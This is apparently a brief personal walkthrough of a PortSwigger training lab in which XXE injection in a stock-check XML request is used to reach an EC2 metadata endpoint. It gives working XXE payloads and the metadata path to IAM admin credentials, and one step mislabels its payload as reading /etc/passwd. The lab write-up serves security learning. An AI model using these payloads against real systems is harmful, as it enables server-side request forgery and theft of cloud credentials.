https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

1) perform a POST request to /product/stock and we can notice that the body is structured using XML

2) try to define an external entity to read /etc/passwd as:
    <!DOCTYPE doc [<!ENTITY xxe SYSTEM "http://169.254.169.254/"> ] >


3) so inject it in the body of the request as
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE doc [<!ENTITY xxe SYSTEM "http://169.254.169.254/"> ] >
    <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

    &xxe; is used to refer to the external entity defined before

4) it returns "latest" directory so now change to http://169.254.169.254/latest 
    continue until getting the secret password
    
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE doc [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ] >
    <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
    


The final URL will be http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
